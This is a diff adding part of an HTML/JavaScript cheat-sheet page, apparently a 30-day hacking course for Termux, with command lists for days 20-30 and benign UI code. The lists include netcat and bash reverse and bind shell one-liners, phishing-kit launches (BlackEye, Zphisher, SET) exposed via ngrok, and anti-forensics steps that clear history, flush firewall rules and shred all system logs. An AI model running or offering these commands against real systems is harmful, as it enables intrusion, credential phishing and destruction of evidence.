+    day: 20, title: "NETCAT — THE HACKER SWISS KNIFE", level: "intermediate",
+    cmds: [
+      { cmd: "pkg install netcat-openbsd", desc: "Install Netcat (OpenBSD version)" },
+      { cmd: "nc -lvp 4444", desc: "Listen on port 4444 (bind shell listener)" },
+      { cmd: "nc 192.168.1.1 4444", desc: "Connect to remote host on port 4444" },
+      { cmd: "nc -zv host 20-80", desc: "Port scan range 20-80 with netcat" },
+      { cmd: "nc -w 3 host 80 < /dev/null", desc: "Test if port 80 is open" },
+      { cmd: "nc -lvp 4444 > received_file", desc: "Receive file via netcat listener" },
+      { cmd: "nc host 4444 < file_to_send", desc: "Send file to netcat listener" },
+      { cmd: "bash -i >& /dev/tcp/host/4444 0>&1", desc: "Bash reverse shell one-liner" },
+      { cmd: "nc -e /bin/bash host 4444", desc: "Netcat reverse shell" },
+      { cmd: "nc -lvp 4444 -e /bin/bash", desc: "Netcat bind shell (serve shell)" },
+    ]
+  },
+  {
+    day: 21, title: "STEGANOGRAPHY & FORENSICS", level: "advanced",
+    cmds: [
+      { cmd: "pkg install steghide", desc: "Install Steghide steg tool" },
+      { cmd: "steghide embed -cf image.jpg -sf secret.txt", desc: "Hide file inside JPEG image" },
+      { cmd: "steghide extract -sf image.jpg", desc: "Extract hidden data from image" },
+      { cmd: "steghide info image.jpg", desc: "Show steganography info of file" },
+      { cmd: "exiftool image.jpg", desc: "Read/write EXIF metadata of file" },
+      { cmd: "strings file.bin | grep flag", desc: "Extract readable strings from binary" },
+      { cmd: "xxd file | head -50", desc: "Hex dump first 50 lines of file" },
+      { cmd: "file mystery.bin", desc: "Identify file type from magic bytes" },
+      { cmd: "binwalk file.bin", desc: "Scan binary for embedded files" },
+      { cmd: "foremost -i image.dd -o output/", desc: "Recover files from disk image" },
+    ]
+  },
+  {
+    day: 22, title: "REVERSE ENGINEERING BASICS", level: "advanced",
+    cmds: [
+      { cmd: "pkg install binutils", desc: "Install binutils (objdump, nm, etc.)" },
+      { cmd: "objdump -d binary", desc: "Disassemble binary to assembly" },
+      { cmd: "nm binary", desc: "List symbols in object file" },
+      { cmd: "ldd binary", desc: "List shared library dependencies" },
+      { cmd: "strace ./binary", desc: "Trace system calls of program" },
+      { cmd: "ltrace ./binary", desc: "Trace library calls of program" },
+      { cmd: "readelf -h binary", desc: "Display ELF file header info" },
+      { cmd: "gdb binary", desc: "Open binary in GNU Debugger" },
+      { cmd: "gdb> disas main", desc: "Disassemble main function in GDB" },
+      { cmd: "r2 -A binary", desc: "Analyze binary with Radare2" },
+    ]
+  },
+  {
+    day: 23, title: "EXPLOITATION TECHNIQUES", level: "advanced",
+    cmds: [
+      { cmd: "pattern_create -l 200", desc: "Create cyclic pattern (Metasploit)" },
+      { cmd: "pattern_offset -q <EIP>", desc: "Find offset of crash address" },
+      { cmd: "python3 -c 'print(\"A\"*100)'", desc: "Generate buffer overflow payload" },
+      { cmd: "checksec binary", desc: "Check binary security mitigations" },
+      { cmd: "ROPgadget --binary binary", desc: "Find ROP gadgets in binary" },
+      { cmd: "one_gadget libc.so.6", desc: "Find one-gadget in libc" },
+      { cmd: "pwndbg> cyclic 100", desc: "Create cyclic pattern in pwndbg" },
+      { cmd: "pwndbg> cyclic -l $rsp", desc: "Find offset from RSP register" },
+      { cmd: "python3 exploit.py", desc: "Run custom Python exploit script" },
+      { cmd: "shellcode=$(python3 -c 'print(\"\\x90\"*100)')", desc: "Generate NOP sled shellcode" },
+    ]
+  },
+  {
+    day: 24, title: "ANONYMITY & DARK WEB", level: "advanced",
+    cmds: [
+      { cmd: "pkg install tor", desc: "Install Tor anonymity network client" },
+      { cmd: "tor", desc: "Start Tor daemon" },
+      { cmd: "torify curl http://check.torproject.org", desc: "Route curl through Tor" },
+      { cmd: "proxychains curl http://site.com", desc: "Route connection through proxies" },
+      { cmd: "cat /etc/proxychains.conf", desc: "View/edit proxychains configuration" },
+      { cmd: "torsocks wget http://site.onion", desc: "Download from .onion site via Tor" },
+      { cmd: "curl --socks5 127.0.0.1:9050 http://site.com", desc: "Use Tor SOCKS5 proxy manually" },
+      { cmd: "macchanger -r wlan0", desc: "Randomize MAC address" },
+      { cmd: "macchanger --show wlan0", desc: "Show current and permanent MAC" },
+      { cmd: "whonix-gateway status", desc: "Check Whonix gateway status" },
+    ]
+  },
+  {
+    day: 25, title: "PHISHING & SOCIAL ENGINEERING", level: "advanced",
+    cmds: [
+      { cmd: "git clone https://github.com/thelinuxchoice/blackeye", desc: "Clone BlackEye phishing tool" },
+      { cmd: "cd blackeye && bash blackeye.sh", desc: "Launch BlackEye phishing framework" },
+      { cmd: "git clone https://github.com/htr-tech/zphisher", desc: "Clone Zphisher advanced tool" },
+      { cmd: "cd zphisher && bash zphisher.sh", desc: "Launch Zphisher" },
+      { cmd: "setoolkit", desc: "Launch Social Engineering Toolkit (SET)" },
+      { cmd: "pkg install ngrok", desc: "Install ngrok for port tunneling" },
+      { cmd: "ngrok http 80", desc: "Expose local port 80 to internet" },
+      { cmd: "ngrok tcp 4444", desc: "Expose TCP port 4444 via ngrok tunnel" },
+      { cmd: "cat ngrok.yml", desc: "View ngrok configuration file" },
+      { cmd: "serveo.net -R 80:localhost:80", desc: "Forward port via Serveo (SSH)" },
+    ]
+  },
+  {
+    day: 26, title: "CRYPTOGRAPHY & ENCODING", level: "advanced",
+    cmds: [
+      { cmd: "echo 'text' | base64", desc: "Encode text to Base64" },
+      { cmd: "echo 'dGV4dA==' | base64 -d", desc: "Decode Base64 string" },
+      { cmd: "echo 'text' | md5sum", desc: "Generate MD5 hash of text" },
+      { cmd: "echo 'text' | sha256sum", desc: "Generate SHA256 hash of text" },
+      { cmd: "openssl enc -aes-256-cbc -in file -out enc.file", desc: "Encrypt file with AES-256-CBC" },
+      { cmd: "openssl enc -d -aes-256-cbc -in enc.file", desc: "Decrypt AES-256-CBC file" },
+      { cmd: "openssl genrsa -out private.pem 2048", desc: "Generate 2048-bit RSA private key" },
+      { cmd: "openssl rsa -in private.pem -pubout > pub.pem", desc: "Extract public key from private" },
+      { cmd: "gpg --gen-key", desc: "Generate GPG key pair" },
+      { cmd: "gpg --encrypt --recipient user file", desc: "Encrypt file with GPG" },
+    ]
+  },
+  {
+    day: 27, title: "ANDROID HACKING — ADB BASICS", level: "advanced",
+    cmds: [
+      { cmd: "pkg install android-tools", desc: "Install Android Debug Bridge (ADB)" },
+      { cmd: "adb devices", desc: "List connected Android devices" },
+      { cmd: "adb shell", desc: "Open interactive shell on device" },
+      { cmd: "adb push local.apk /sdcard/", desc: "Push file to Android device" },
+      { cmd: "adb pull /sdcard/file local/", desc: "Pull file from Android device" },
+      { cmd: "adb install app.apk", desc: "Install APK on connected device" },
+      { cmd: "adb uninstall com.package.name", desc: "Uninstall app from device" },
+      { cmd: "adb logcat", desc: "View real-time Android device logs" },
+      { cmd: "adb shell pm list packages", desc: "List all installed packages on device" },
+      { cmd: "adb shell screencap -p /sdcard/shot.png", desc: "Take screenshot via ADB" },
+    ]
+  },
+  {
+    day: 28, title: "ADVANCED SCRIPTING AUTOMATION", level: "advanced",
+    cmds: [
+      { cmd: "crontab -e", desc: "Edit user crontab for scheduled tasks" },
+      { cmd: "0 2 * * * /path/script.sh", desc: "Cron: run script daily at 2 AM" },
+      { cmd: "watch -n 5 'df -h'", desc: "Refresh disk usage every 5 seconds" },
+      { cmd: "while true; do ping -c1 host; sleep 10; done", desc: "Infinite ping monitor loop" },
+      { cmd: "seq 1 255 | xargs -I{} ping -c1 192.168.1.{}", desc: "Ping sweep entire subnet" },
+      { cmd: "for ip in $(cat ips.txt); do nmap -p 80 $ip; done", desc: "Loop nmap over IP list" },
+      { cmd: "curl -s http://ip-api.com/json/8.8.8.8 | python3 -m json.tool", desc: "IP geolocation lookup" },
+      { cmd: "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head", desc: "Top IPs from access log" },
+      { cmd: "sed -i 's/old/new/g' file.txt", desc: "Find and replace text in file" },
+      { cmd: "find / -name '*.conf' 2>/dev/null", desc: "Find all config files on system" },
+    ]
+  },
+  {
+    day: 29, title: "CTF TOOLS & CHALLENGES", level: "advanced",
+    cmds: [
+      { cmd: "pip install pwntools", desc: "Install pwntools for CTF exploitation" },
+      { cmd: "python3 -c \"from pwn import *; context.arch='amd64'\"", desc: "Initialize pwntools context" },
+      { cmd: "cyclic 100", desc: "Generate De Bruijn pattern (pwntools)" },
+      { cmd: "cyclic -l 0x6161616f", desc: "Find offset of specific bytes" },
+      { cmd: "checksec binary", desc: "Check NX, PIE, RELRO, canary flags" },
+      { cmd: "readelf -s binary | grep main", desc: "Find address of main function" },
+      { cmd: "python3 -c \"import struct; print(struct.pack('<I', 0xdeadbeef))\"", desc: "Pack little-endian address" },
+      { cmd: "ghidra", desc: "Launch Ghidra reverse engineering tool" },
+      { cmd: "strings binary | grep -i flag", desc: "Grep for flags in binary strings" },
+      { cmd: "cat /proc/self/maps", desc: "View memory map of current process" },
+    ]
+  },
+  {
+    day: 30, title: "ADVANCED PERSISTENCE & CLEANUP", level: "advanced",
+    cmds: [
+      { cmd: "crontab -l", desc: "List all cron jobs of current user" },
+      { cmd: "cat /etc/rc.local", desc: "View startup script file" },
+      { cmd: "history -c", desc: "Clear bash command history" },
+      { cmd: "rm -rf ~/.bash_history", desc: "Delete bash history file permanently" },
+      { cmd: "shred -vzu -n5 file.txt", desc: "Securely wipe file (5 passes)" },
+      { cmd: "wipe -rf /path/", desc: "Recursively wipe directory securely" },
+      { cmd: "pkill -u username", desc: "Kill all processes by specific user" },
+      { cmd: "iptables -F", desc: "Flush all firewall rules" },
+      { cmd: "iptables -A INPUT -s 1.2.3.4 -j DROP", desc: "Block specific IP via firewall" },
+      { cmd: "find /var/log/ -exec shred -vzu {} \\;", desc: "Destroy all log files (forensics)" },
+    ]
+  }
+];
+
+// ===== BUILD UI =====
+function buildDayFilters() {
+  const container = document.getElementById('dayFilters');
+  let html = `<button class="day-btn all-btn active" onclick="filterDay('all', this)">ALL DAYS</button>`;
+  for (let i = 1; i <= 30; i++) {
+    html += `<button class="day-btn" onclick="filterDay(${i}, this)">D${i}</button>`;
+  }
+  container.innerHTML = html;
+}
+
+function getLevelBadge(level) {
+  const map = { basic: 'badge-basic', intermediate: 'badge-intermediate', advanced: 'badge-advanced' };
+  return `<span class="day-badge ${map[level]}">${level.toUpperCase()}</span>`;
+}
+
+function buildContent() {
+  const main = document.getElementById('mainContent');
+  let html = '';
+  let total = 0;
+
+  days.forEach(d => {
+    total += d.cmds.length;
+    const cmdsHtml = d.cmds.map(c => `
+      <div class="cmd-card" onclick="copyCmd('${c.cmd.replace(/'/g, "\\'")}')">
+        <div class="cmd-line">
+          <span class="cmd-dollar">$</span>
+          <span class="cmd-text">${escapeHtml(c.cmd)}</span>
+        </div>
+        <div class="cmd-desc"># ${c.desc}</div>
+        <span class="cmd-tag">CLICK TO COPY</span>
+      </div>
+    `).join('');
+
+    html += `
+      <div class="day-section" id="day-${d.day}" data-day="${d.day}" data-level="${d.level}">
+        <div class="day-header" onclick="toggleDay(${d.day})">
+          <span class="day-num">DAY ${String(d.day).padStart(2,'0')}</span>
+          <span class="day-title">${d.title}</span>
+          ${getLevelBadge(d.level)}
+          <span class="day-badge" style="border-color:#555;color:#555;margin-left:5px">${d.cmds.length} CMDS</span>
+          <span class="day-toggle">▼</span>
+        </div>
+        <div class="commands-grid">${cmdsHtml}</div>
+      </div>
+    `;
+  });
+
+  main.innerHTML = html;
+  document.getElementById('totalCmds').textContent = total + '+';
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function toggleDay(day) {
+  const el = document.getElementById('day-' + day);
+  el.classList.toggle('collapsed');
+}
+
+// ===== FILTER =====
+let activeDay = 'all';
+
+function filterDay(day, btn) {
+  activeDay = day;
+  document.querySelectorAll('.day-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  filterAll();
+  if (day !== 'all') {
+    setTimeout(() => {
+      const el = document.getElementById('day-' + day);
+      if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }, 100);
+  }
+}
+
+function filterAll() {
+  const query = document.getElementById('searchInput').value.toLowerCase();
+  let visibleCount = 0;
+
+  days.forEach(d => {
+    const section = document.getElementById('day-' + d.day);
+    const dayMatch = activeDay === 'all' || parseInt(activeDay) === d.day;
+
+    if (!dayMatch) { section.classList.add('hidden'); return; }
+
+    if (!query) {
+      section.classList.remove('hidden');
+      // Reset card visibility
+      section.querySelectorAll('.cmd-card').forEach(c => c.style.display = '');
+      visibleCount++;
+      return;
+    }
+
+    let anyVisible = false;
+    section.querySelectorAll('.cmd-card').forEach(card => {
+      const txt = card.textContent.toLowerCase();
+      if (txt.includes(query)) {
+        card.style.display = '';
+        anyVisible = true;
+      } else {
+        card.style.display = 'none';
+      }
+    });
+
+    if (anyVisible) {
+      section.classList.remove('hidden');
+      visibleCount++;
+    } else {
+      section.classList.add('hidden');
+    }
+  });
+
+  const info = document.getElementById('resultsInfo');
+  const noRes = document.getElementById('noResults');
+  if (query) {
+    info.textContent = `// FOUND IN ${visibleCount} SECTIONS`;
+    noRes.style.display = visibleCount === 0 ? 'block' : 'none';
+  } else {
+    info.textContent = '';
+    noRes.style.display = 'none';
+  }
+}
+
+// ===== COPY =====
+function copyCmd(cmd) {
+  navigator.clipboard.writeText(cmd).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = cmd; document.body.appendChild(ta);
+    ta.select(); document.execCommand('copy');
+    document.body.removeChild(ta);
+  });
+  const toast = document.getElementById('toast');
+  toast.classList.add('show');
+  setTimeout(() => toast.classList.remove('show'), 1800);
+}
+
+// ===== CURSOR =====
+const cursor = document.getElementById('cursor');
+const dot = document.getElementById('cursorDot');
+document.addEventListener('mousemove', e => {
+  cursor.style.left = (e.clientX - 10) + 'px';
+  cursor.style.top = (e.clientY - 10) + 'px';
+  dot.style.left = (e.clientX - 2) + 'px';
+  dot.style.top = (e.clientY - 2) + 'px';
+});
+document.addEventListener('mousedown', () => cursor.style.transform = 'scale(0.7)');
+document.addEventListener('mouseup', () => cursor.style.transform = 'scale(1)');
+
+// ===== MATRIX RAIN =====
+const canvas = document.getElementById('matrix');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+window.addEventListener('resize', () => {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+});
+const cols = Math.floor(canvas.width / 20);
+const drops = Array(cols).fill(1);
+const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ{}[]<>/\\|=+-_!@#$%^&*~';
+
+function matrixDraw() {
+  ctx.fillStyle = 'rgba(0,0,0,0.05)';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  ctx.fillStyle = '#00ff41';
+  ctx.font = '14px Share Tech Mono';
+  drops.forEach((y, i) => {
+    const char = chars[Math.floor(Math.random() * chars.length)];
+    ctx.fillText(char, i * 20, y * 20);
+    if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  });
+}
+setInterval(matrixDraw, 50);
+
+// INIT
+buildDayFilters();
+buildContent();
+</script>
+</body>
+</html>
